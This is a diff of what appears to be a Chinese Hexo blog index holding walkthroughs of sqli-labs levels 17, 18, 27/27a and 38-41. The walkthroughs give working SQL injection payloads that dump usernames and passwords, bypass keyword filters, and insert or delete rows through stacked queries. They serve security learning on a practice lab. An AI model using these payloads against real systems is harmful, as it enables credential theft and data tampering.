-  <entry>
     <title>sqli-labs_18</title>
     <url>/2022/11/15/sqli-labs_18/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在这一关的时候出了bug，没有报错。查了半天原因，最终猜测是数据库版本的问题，让人实在难受，最终只得重新删除sqli-labs再次下载。在这里郑重警示自己，不要使用MySQL5.7.26及以上的数据库。</p>
@@ -4224,6 +4282,45 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li>
 </ol>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>从本关开始，不再局限于提交方式了</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs_17</title>
+    <url>/2022/11/11/sqli-labs_17/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关开始有了新变化，是一个更新密码的页面，这说明已经成功进入了系统，接下来就看看如何解决吧。</p>
+<span id="more"></span>
+
+<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
+<li>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>如果不知道源码，去一遍遍尝试，会发现无论是布尔盲注还是时间盲注都无法得到预期结果，因此我们可以采用报错注入。<br>首先，那我们可以从源码中发现，有一个过滤函数check_input，其过滤步骤是：</li>
+</ol>
+<ul>
+<li><code>substr($value,0,15)</code>截断到15位</li>
+<li>单引号，双引号，反斜杠，null自动使用反斜杠转义</li>
+<li>stripslashes()去掉多余的反斜杠<br>然后，passwd没有使用过滤函数过滤，因而可以进行注入。由此可使用报错注入。</li>
+</ul>
+<ol start="2">
+<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>第一个用户名填写：admin<br>第二个密码填写所需的报错注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;users&#x27;),0x5c),1))#    爆字段名</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users limit 0,1)test),0x7e),1) #  爆用户</span><br><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users where username=&#x27;admin&#x27; limit 0,1)test),0x7e),1) #      爆密码</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>本关的重点在于找到注入方式，如何去通过报错注入获取所需信息。技术上仍然还是那些。也可参见第二篇致谢的其它报错函数注入。</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a><br><a href="https://cloud.tencent.com/developer/article/1906116">全网最全sqli-labs通关攻略</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -4521,6 +4618,42 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs_27+27a</title>
+    <url>/2022/11/17/sqli-labs_27+27a/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相比之前并没有大的变化，照猫画虎罢了</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>测试并判断注入类型<br>本关通过查看源码可知，select和union被过滤了，但and和or这次没被过滤</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>问题不大，可以通过大小写或重写绕过</p>
+</li>
+<li><p>获取当前数据库名和数据库版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;security&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(concat(username,&#x27;:&#x27;,password))from(users)limit%0b0,1)),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="第27a关"><a href="#第27a关" class="headerlink" title="第27a关"></a>第27a关</h2><p>与27关相比，只是闭合方式变更为”</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>a piece of cake~</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs_28</title>
     <url>/2022/11/17/sqli-labs_28+28a/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绕过该绕过的，注入照常注入</p>
@@ -4552,42 +4685,6 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
 <h2 id="第28a关"><a href="#第28a关" class="headerlink" title="第28a关"></a>第28a关</h2><p>与28关相比，只是过滤条件少了几个</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>构造语句的原理还不甚明白，有些人写的博客能过，有些不能过。<br>总的来说，用%00是比较通用简单的方式</p>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/weixin_39934520/article/details/105801767">Sqli-labs之Less-28和Less-28a</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs_27+27a</title>
-    <url>/2022/11/17/sqli-labs_27+27a/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相比之前并没有大的变化，照猫画虎罢了</p>
-<span id="more"></span>
-
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>测试并判断注入类型<br>本关通过查看源码可知，select和union被过滤了，但and和or这次没被过滤</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>问题不大，可以通过大小写或重写绕过</p>
-</li>
-<li><p>获取当前数据库名和数据库版本号</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;security&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(concat(username,&#x27;:&#x27;,password))from(users)limit%0b0,1)),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="第27a关"><a href="#第27a关" class="headerlink" title="第27a关"></a>第27a关</h2><p>与27关相比，只是闭合方式变更为”</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>a piece of cake~</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -4843,6 +4940,55 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs_38-41</title>
+    <url>/2022/11/18/sqli-labs_38-41/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又可以学到新的注入方式–堆叠注入。</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li>测试并判断注入类型<br>首先查看源码，发现这样一条语句<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)</span><br></pre></td></tr></table></figure>
+mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用分号分隔的SQL语句。<br>详细可见：<a href="https://www.php.net/manual/zh/mysqli.multi-query.php#:~:text=mysqli_multi_query%20%28mysqli%20%24link%2C%20string%20%24query%29%3A%20bool%20%E6%89%A7%E8%A1%8C%E4%B8%80%E4%B8%AA%20SQL,%E8%AF%AD%E5%8F%A5%E3%80%82%20%E8%A6%81%E8%8E%B7%E5%BE%97%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%BB%93%E6%9E%9C%E9%9B%86%EF%BC%8C%E8%AF%B7%E4%BD%BF%E7%94%A8%20mysqli_use_result%20%28%29%20%E6%88%96%20mysqli_store_result%20%28%29%20%E5%87%BD%E6%95%B0%E3%80%82">mysqli_multi_query</a></li>
+</ol>
+<p>那么，当我们看到这条语句时，就可以注意能否使用<strong>堆叠注入</strong>了。<br>所谓堆叠注入，简单地说，是能够同时注入多条语句。<br>实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
+<ol start="2">
+<li><p>猜解SQL查询语句中的字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆出显示位</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取当前数据库名和数据库版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>增删改<br>这里示例一个增，也即为插入数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; ;insert into users(id,username,password)values(100,&#x27;772211&#x27;,&#x27;112277&#x27;);</span><br><span class="line">?id=100</span><br></pre></td></tr></table></figure>
+<p>先后输入这两条语句，可以看到插入成功<br>示例一个删</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) ;delete from users where id=1;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="第39关"><a href="#第39关" class="headerlink" title="第39关"></a>第39关</h2><p>与第38关相比差不多，只不过第39关不需要单引号</p>
+<h2 id="第40关"><a href="#第40关" class="headerlink" title="第40关"></a>第40关</h2><p>与第38关相比差不多，只不过第40关的闭合方式是’)</p>
+<h2 id="第41关"><a href="#第41关" class="headerlink" title="第41关"></a>第41关</h2><p>与38关差不多，也可堆叠注入</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>冲冲冲</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/qq_45691294/article/details/107376284">SQL注入之堆叠注入</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs_36+37</title>
     <url>/2022/11/18/sqli-labs_36+37/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这关基本是在重复之前的注入方式</p>
@@ -4882,55 +5028,6 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
 <h1 id="第37关"><a href="#第37关" class="headerlink" title="第37关"></a>第37关</h1><p>和第34关差不多，这一关网上有说按第34关第1种方法能成功，但我没成功<br>因此我选择第2种，使用burp抓包注入。</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>毫无难度</p>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs_38-41</title>
-    <url>/2022/11/18/sqli-labs_38-41/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又可以学到新的注入方式–堆叠注入。</p>
-<span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li>测试并判断注入类型<br>首先查看源码，发现这样一条语句<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)</span><br></pre></td></tr></table></figure>
-mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用分号分隔的SQL语句。<br>详细可见：<a href="https://www.php.net/manual/zh/mysqli.multi-query.php#:~:text=mysqli_multi_query%20%28mysqli%20%24link%2C%20string%20%24query%29%3A%20bool%20%E6%89%A7%E8%A1%8C%E4%B8%80%E4%B8%AA%20SQL,%E8%AF%AD%E5%8F%A5%E3%80%82%20%E8%A6%81%E8%8E%B7%E5%BE%97%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%BB%93%E6%9E%9C%E9%9B%86%EF%BC%8C%E8%AF%B7%E4%BD%BF%E7%94%A8%20mysqli_use_result%20%28%29%20%E6%88%96%20mysqli_store_result%20%28%29%20%E5%87%BD%E6%95%B0%E3%80%82">mysqli_multi_query</a></li>
-</ol>
-<p>那么，当我们看到这条语句时，就可以注意能否使用<strong>堆叠注入</strong>了。<br>所谓堆叠注入，简单地说，是能够同时注入多条语句。<br>实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
-<ol start="2">
-<li><p>猜解SQL查询语句中的字段数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>爆出显示位</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获取当前数据库名和数据库版本号</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>增删改<br>这里示例一个增，也即为插入数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; ;insert into users(id,username,password)values(100,&#x27;772211&#x27;,&#x27;112277&#x27;);</span><br><span class="line">?id=100</span><br></pre></td></tr></table></figure>
-<p>先后输入这两条语句，可以看到插入成功<br>示例一个删</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) ;delete from users where id=1;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="第39关"><a href="#第39关" class="headerlink" title="第39关"></a>第39关</h2><p>与第38关相比差不多，只不过第39关不需要单引号</p>
-<h2 id="第40关"><a href="#第40关" class="headerlink" title="第40关"></a>第40关</h2><p>与第38关相比差不多，只不过第40关的闭合方式是’)</p>
-<h2 id="第41关"><a href="#第41关" class="headerlink" title="第41关"></a>第41关</h2><p>与38关差不多，也可堆叠注入</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>冲冲冲</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/qq_45691294/article/details/107376284">SQL注入之堆叠注入</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -5096,52 +5193,6 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_5+6</title>
-    <url>/2022/11/08/sqli-labs_5+6/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第5，6关基本一致，区别只在于单引号和双引号，因此放在一起了。这两关的关键点在于：正确时不返回结果，错误时有报错信息。因此综合判断之下，使用报错注入的方式最好。</p>
-<span id="more"></span>
-
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p>
-</li>
-<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p>
-</li>
-<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
-<p>可得字段数为3</p>
-</li>
-<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p>
